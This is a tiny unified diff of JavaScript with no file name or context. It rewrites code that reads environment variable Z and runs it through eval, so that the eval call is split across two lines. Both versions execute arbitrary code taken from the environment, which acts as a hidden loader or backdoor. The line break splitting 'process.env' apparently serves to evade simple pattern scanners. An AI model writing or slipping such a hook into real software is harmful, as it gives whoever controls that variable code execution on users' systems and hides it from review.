@@ -1,2 +1,2 @@
-e=process.env.Z
-eval(e)
+eval(process
+.env.Z)
